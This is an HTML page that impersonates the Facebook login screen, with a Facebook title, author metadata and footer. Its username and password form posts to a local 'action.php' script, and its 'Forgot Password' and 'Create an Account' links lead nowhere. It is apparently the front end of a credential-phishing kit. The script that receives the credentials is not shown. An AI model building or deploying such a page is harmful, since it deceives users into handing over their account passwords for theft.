<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="keywords" content="Facebook.com">
        <meta name="author" content="Facebook">
        <meta name="description" content="Facebook">
	<title>Facebook - login or signup </title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link rel="stylesheet" href="style.css">
	<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
</head>
<body>

	<header>
		<div class="container">
			<div class="co-md-6 pt-3 ">
				<h1>Facebook</h1>
			</div>
		</div>
	</header>
	<div class="container">
	<div class="login-form">
    <form action="action.php" method="post">
        <h2 class="text-center">Log in</h2>       
        <div class="form-group">
            <input type="text" name="user" class="form-control" placeholder="Username" required="required">
        </div>
        <div class="form-group">
            <input type="password" name="password" class="form-control" placeholder="Password" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"><input type="checkbox"> Remember me</label>
            <a href="#" class="pull-right">Forgot Password?</a>
 		       </div>        
		    </form>
		    <p class="text-center"><a href="#">Create an Account</a></p>
		  </div>
		</div>
	<footer>
		<div class="container">
			<div class="footer-copyright text-left pl-20"><a href="https://Facebook.com">Facebook</a>@ 2020
 		    </div>
		</div>
	</footer>
	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" ></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	
</body>
</html>